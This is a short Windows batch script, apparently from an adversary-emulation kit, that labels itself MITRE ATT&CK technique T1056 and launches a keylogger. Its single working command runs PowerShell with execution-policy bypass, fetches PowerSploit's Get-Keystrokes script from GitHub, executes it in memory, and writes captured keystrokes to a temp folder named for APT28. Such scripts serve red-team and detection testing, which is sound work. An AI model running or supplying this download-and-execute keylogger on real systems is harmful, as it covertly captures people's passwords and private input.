@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Input Capture (T1056)
ECHO.
ECHO [+] Initiating Powershell Keylogger to capture KeyStrokes
ECHO -------------------------------------------------------------------
powershell.exe -ep bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1'); Get-Keystrokes -LogPath %temp%\APT28\keycapture.log"
ping 127.0.0.1 -n 4 > nul
ECHO.
